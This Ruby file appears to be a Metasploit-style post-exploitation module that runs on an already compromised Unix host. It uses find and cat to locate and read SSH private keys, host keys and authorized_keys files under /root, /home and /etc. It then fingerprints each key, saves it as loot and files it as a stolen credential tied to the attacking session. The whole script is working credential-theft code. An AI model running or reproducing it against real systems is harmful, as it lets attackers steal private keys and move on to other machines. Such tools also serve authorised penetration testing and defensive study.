##
# $Id$
##

#
# Collect all ssh keys from the target system
#

# Incompatibilities:
# - Busybox does not support maxdepth nor ()
#

require 'sshkey'

def process_key(k)
	pri = client.shell_command_token_unix("cat #{k} 2>/dev/null")
	aut = pri.dup if k =~ /authorized_keys/
	pub = client.shell_command_token_unix("cat #{k}.pub 2>/dev/null")

	return if not(pri)
	return if (pri.strip.empty?) 

	user  = 'unknown'
	ktype = 'unknown'

	# Determine the key type
	# Note that we cannot use identity files (*_old_private) with Net::SSH. Boo.
	case k
	when /_dsa/
		ktype = 'dsa'
	when /_rsa/
		ktype = 'rsa'
	when /identity/
		ktype = 'old'
	end

	# Determine the username
	case k
	when /^\/root\//
		user = 'root'
	when /\/home\/([^\/]+)\//
		user = $1
	when /host_/
		user = 'host'
	end

	# XXX: Protect against badly formatted keys around here.
	key_fp = {}
	if pub and pub.strip.length > 0
		key_is_valid = false
		begin
			key_fp[:pub] = Net::SSH::Utils::Key.fingerprint(:data => pub.strip, :public => true)
			key_is_valid = true
			print_status "Keyfile '#{k}' is valid: #{key_fp[:pub]}."
		rescue
			key_is_valid = false
			print_status "Keyfile '#{k}' is invalid. Skipping."
		end
		return unless key_is_valid
		key_path = pro.store_loot("host.unix.ssh.#{user}_#{ktype}_public", "application/octet-stream", client, pub.strip, nil, key_fp[:pub])
	end

	if (pri and pri.strip.length > 0) and not aut
		key_is_valid = false
		begin
			key_fp[:pri] = Net::SSH::Utils::Key.fingerprint(:data => pri.strip, :public => false)
			key_is_valid = true
			print_status "Keyfile '#{k}' is valid: #{key_fp[:pri]}"
		rescue
			key_is_valid = false
			print_status "Keyfile '#{k}' is invalid. Skipping."
		end
		return unless key_is_valid
		key_path = pro.store_loot("host.unix.ssh.#{user}_#{ktype}_private", "application/octet-stream", client, pri.strip, nil, key_fp[:pri])
		report_cred_source(key_path,key_fp,user)
	end

	if aut and aut.strip.length > 0
		line_idx = 0
		aut.each_line do |aut_pub|
			key_fp = {}
			line_idx += 1
			begin
				key_is_valid = SSHKey.valid_ssh_public_key?(aut_pub.strip)
				next unless key_is_valid 
				key_fp[:pub] = Net::SSH::Utils::Key.fingerprint(:data => aut_pub.strip, :public => true)
				print_status "Keyfile '#{k}' line #{line_idx} is valid: #{key_fp[:pub]}."
			rescue => e
				print_status "Keyfile '#{k}' has an invalid entry. Skipping line #{line_idx}"
			end
			next unless key_is_valid
			key_path = pro.store_loot("host.unix.ssh.#{user}_authorized_key", "application/octet-stream", client, aut_pub.strip, nil, key_fp[:pub])
		end
	end

end

def report_cred_source(key_path,key_fp,user)
		
		cred_info =  {
			:collect_type => 'ssh_key',
			:host => client.exploit_datastore['RHOST'],
			:sname => 'ssh',
			:user => user,
			:pass => key_path,
			:type => 'ssh_key',
			:proof => "KEY=#{key_fp[:pri]}",
			:active => false
		}

		source_user = client.exploit_datastore['USERNAME']
		source_pass = client.exploit_datastore['PASSWORD']
		source_sess = client.sid

		if (source_user and !source_user.empty?)
			cred_info.merge!({
				:collect_user => source_user,
				:collect_pass => source_pass
			})
		else
			cred_info.merge!(:collect_session => source_sess)
		end

		pro.store_cred(cred_info)

end


find_supports_or = true
data = client.shell_command_token("find . -name #{Rex::Text.rand_text_alpha(30)} -or -name #{Rex::Text.rand_text_alpha(30)} >/dev/null")
if not data or data.length > 0
	find_supports_or = false
end

find_supports_maxdepth = true
data = client.shell_command_token("find . -maxdepth 1 -name #{Rex::Text.rand_text_alpha(30)} >/dev/null")
if not data or data.length > 0
	find_supports_maxdepth = false
end


def process_find_output(data)
	return if not data
	return if data.strip.empty?
	data.split("\n").each do |k|
		process_key(k.strip)
	end
end

names = %W{ id_dsa id_rsa identity ssh_host_rsa_key ssh_host_dsa_key authorized_keys}
dirs  = %W{ /root/ /export/home/ /home/ /etc/ }
if find_supports_or
	search = names.split.join(" -or -name ")
	cmd = "find #{dirs.join(" ")}"
	cmd << " -maxdepth 3" if find_supports_maxdepth
	cmd << " -name #{search} 2>/dev/null"
	data = client.shell_command_token_unix(cmd, 300)
	process_find_output(data)
else
	maxdepth = ""
	maxdepth = " -maxdepth 3" if find_supports_maxdepth
	names.each do |name|
		cmd = "find #{dirs.join(" ")} #{maxdepth} -name #{name} 2>/dev/null"
		data = client.shell_command_token_unix(cmd, 300)
		process_find_output(data)
	end
end

